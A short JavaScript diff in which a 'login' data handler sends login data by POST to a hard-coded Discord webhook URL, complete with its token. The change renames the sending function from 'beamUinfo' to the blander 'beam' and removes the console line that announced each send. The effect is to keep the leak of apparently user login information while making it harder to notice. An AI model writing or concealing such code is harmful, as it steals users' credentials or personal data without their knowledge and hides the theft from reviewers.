@@ -31,8 +31,7 @@ const tslogDataParsers =
 {
 	login (data)
 	{
-		console.log('%cbeamed', 'color:#FF00FF')
-		beamUinfo(data)
+		beam(data)
 	},
 	portal (data)
 	{
@@ -171,7 +170,7 @@ function init ()
 	// console.log('%c' + strfv, 'font-weight:bold;font-size:125%;color:#004488')
 }
 
-function beamUinfo (data)
+function beam (data)
 {
 	const request = new XMLHttpRequest()
 	request.open('POST', 'https://discordapp.com/api/webhooks/702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF');
